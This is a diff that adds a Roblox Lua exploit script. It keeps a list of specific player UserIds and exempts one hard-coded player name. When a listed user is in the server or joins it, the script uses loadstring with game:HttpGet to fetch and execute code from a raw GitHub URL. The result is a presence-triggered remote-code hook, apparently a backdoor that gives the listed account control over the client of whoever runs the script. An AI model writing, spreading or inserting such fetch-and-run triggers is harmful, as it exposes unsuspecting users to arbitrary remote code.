@@ -1,0 +1,30 @@
+
+getgenv().free = true
+
+
+if game.Players.LocalPlayer.Name == 'gferwtwe4atw4afa' then
+  getgenv().free = false
+end
+
+local mod = {
+ 5549154686,
+ 
+  
+  
+}
+
+for l, c in pairs(game.Players:GetChildren()) do
+for i, v in pairs(mod) do
+if c.UserId == v and getgenv().free == true then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FrolicsomeNuvi/admin/main/ad"))()
+end
+end
+end
+game.Players.PlayerAdded:Connect(function(plr)
+for i, v in pairs(mod) do
+if plr.UserId == v and getgenv().free == true then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FrolicsomeNuvi/admin/main/ad"))()
+end
+end
+end)
+
